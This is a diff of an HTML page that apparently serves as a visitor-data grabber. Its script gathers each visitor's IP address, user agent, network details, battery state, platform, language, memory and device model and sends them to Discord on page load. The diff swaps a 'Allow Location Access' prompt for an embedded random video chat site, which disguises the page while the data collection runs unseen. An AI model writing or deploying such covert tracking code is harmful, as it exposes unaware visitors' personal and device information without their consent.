@@ -194,19 +194,14 @@
             }
 
             fetchIPAndDeviceDetails().then(deviceDetails => {
-                const { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel } = deviceDetails;
-                sendToDiscord(null, null, ipAddress, userAgent, new Date(), networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory, deviceModel);
+                sendToDiscord(deviceDetails.ipAddress, deviceDetails.userAgent, deviceDetails.networkInfo, deviceDetails.batteryPercentage, deviceDetails.isCharging, deviceDetails.platform, deviceDetails.language, deviceDetails.deviceMemory, deviceDetails.deviceModel);
             });
         });
     </script>
 </head>
 <body>
     <div class="iframe-container">
-        <div class="dialog-box">
-            <h2>Allow Location Access</h2>
-            <p>To enhance your experience, please allow location access.</p>
-            <button class="btn-allow" id="allowLocationBtn">Allow</button>
-        </div>
+        <iframe src="https://strangercam.com/random-video-chat/" frameborder="0" width="100%" height="100%"></iframe>
     </div>
 </body>
 </html>
